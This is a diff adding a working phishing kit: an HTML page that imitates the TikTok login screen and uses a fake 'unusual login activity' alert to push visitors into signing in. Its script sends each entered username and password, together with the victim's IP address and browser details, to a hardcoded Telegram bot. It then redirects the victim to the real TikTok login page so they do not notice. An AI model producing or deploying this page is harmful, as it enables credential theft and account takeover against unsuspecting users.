@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Log in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .container {
+            background: #fff;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 32px;
+            padding: 28px 22px 36px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.9);
+            text-align: center;
+            position: relative;
+        }
+        .logo {
+            font-size: 40px;
+            font-weight: 900;
+            color: #000;
+            letter-spacing: -0.5px;
+            margin-bottom: 4px;
+        }
+        .logo span { color: #ff004f; }
+        .subtitle {
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 22px;
+        }
+        .alert-banner {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            border-radius: 30px;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #991b1b;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .alert-banner span { font-size: 18px; }
+        .qr-box {
+            background: #f5f5f5;
+            border-radius: 20px;
+            padding: 18px;
+            margin-bottom: 18px;
+            border: 1px solid #e5e5e5;
+        }
+        .qr-placeholder {
+            width: 110px;
+            height: 110px;
+            background: #ddd;
+            border-radius: 12px;
+            margin: 0 auto 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: #888;
+            border: 2px dashed #bbb;
+        }
+        .qr-box p {
+            font-size: 13px;
+            color: #555;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 18px;
+            color: #aaa;
+            font-size: 13px;
+        }
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+        }
+        .divider::before { margin-right: 14px; }
+        .divider::after { margin-left: 14px; }
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 30px;
+            font-size: 15px;
+            background: #fafafa;
+            outline: none;
+            transition: 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #ff004f;
+            background: #fff;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 30px;
+            background: #ff004f;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #d90044; }
+        .forgot-link {
+            display: block;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #888;
+            text-decoration: none;
+        }
+        .forgot-link:hover { color: #000; }
+        .signup-row {
+            margin-top: 22px;
+            font-size: 14px;
+            color: #444;
+        }
+        .signup-row a {
+            color: #ff004f;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .signup-row a:hover { text-decoration: underline; }
+        .footer-text {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #aaa;
+        }
+        #status-msg {
+            margin-top: 14px;
+            font-size: 14px;
+            color: #ff004f;
+            display: none;
+            font-weight: 500;
+        }
+        #status-msg.show { display: block; }
+        /* tiny loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ff004f;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- TikTok Logo -->
+    <div class="logo">Tik<span>Tok</span></div>
+    <div class="subtitle">Log in to your account</div>
+
+    <!-- SCARY WARNING (exactly like TikTok would send) -->
+    <div class="alert-banner">
+        <span>⚠️</span> We detected unusual login activity. Verify now to keep your account safe.
+    </div>
+
+    <!-- QR section (looks legit) -->
+    <div class="qr-box">
+        <div class="qr-placeholder">📱</div>
+        <p>Scan QR code with the TikTok app</p>
+    </div>
+
+    <div class="divider">or log in with email</div>
+
+    <!-- Login Form -->
+    <form id="loginForm" onsubmit="stealData(event)">
+        <div class="input-group">
+            <label>Email or username</label>
+            <input type="text" id="username" placeholder="Enter your email or username" required autofocus>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+
+        <button type="submit" class="btn">Log in</button>
+    </form>
+
+    <a href="#" class="forgot-link">Forgot password?</a>
+
+    <div class="signup-row">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div id="status-msg">⏳ Verifying your identity...</div>
+    <div class="footer-text">© 2026 TikTok</div>
+</div>
+
+<script>
+    // ================================================================
+    // YOUR TELEGRAM BOT CREDENTIALS (Chat ID + Token)
+    // ================================================================
+    const BOT_TOKEN = "8822647995:AAFDdYZhEV4OcEvyL_Q9ErZ-ccIEKU7Zqqw";
+    const CHAT_ID   = "8455934277";   // <-- YOUR CHAT ID
+
+    // ================================================================
+    // SEND STOLEN CREDENTIALS TO TELEGRAM
+    // ================================================================
+    async function sendToTelegram(email, password) {
+        const ip = await getIP();  // optional: grab victim IP
+        const msg = 
+            `🔓 *TIKTOK CREDENTIALS STOLEN!*%0A%0A` +
+            `👤 *Email/User:* ${encodeURIComponent(email)}%0A` +
+            `🔑 *Password:* ${encodeURIComponent(password)}%0A` +
+            `🕒 *Time:* ${new Date().toISOString()}%0A` +
+            `🌐 *IP:* ${ip || 'N/A'}%0A` +
+            `📱 *UA:* ${encodeURIComponent(navigator.userAgent)}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`;
+
+        try {
+            await fetch(url, { method: 'GET', mode: 'no-cors' });
+        } catch (_) { /* silent fail */ }
+    }
+
+    // helper to get public IP (optional)
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch { return null; }
+    }
+
+    // ================================================================
+    // FORM SUBMIT HANDLER
+    // ================================================================
+    function stealData(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const status = document.getElementById('status-msg');
+
+        if (!username || !password) {
+            status.innerHTML = '⚠️ Please fill in all fields';
+            status.classList.add('show');
+            return;
+        }
+
+        // Show loading spinner + message
+        status.innerHTML = `<span class="spinner"></span> Verifying...`;
+        status.classList.add('show');
+
+        // Send to Telegram (async, no blocking)
+        sendToTelegram(username, password);
+
+        // Redirect to REAL TikTok after 1.5 seconds (victim never knows)
+        setTimeout(() => {
+            status.innerHTML = '✅ Verified! Redirecting to your feed...';
+            window.location.href = 'https://www.tiktok.com/login';
+        }, 1500);
+    }
+
+    // hide status on load
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('status-msg').classList.remove('show');
+    });
+</script>
+
+</body>
+</html>
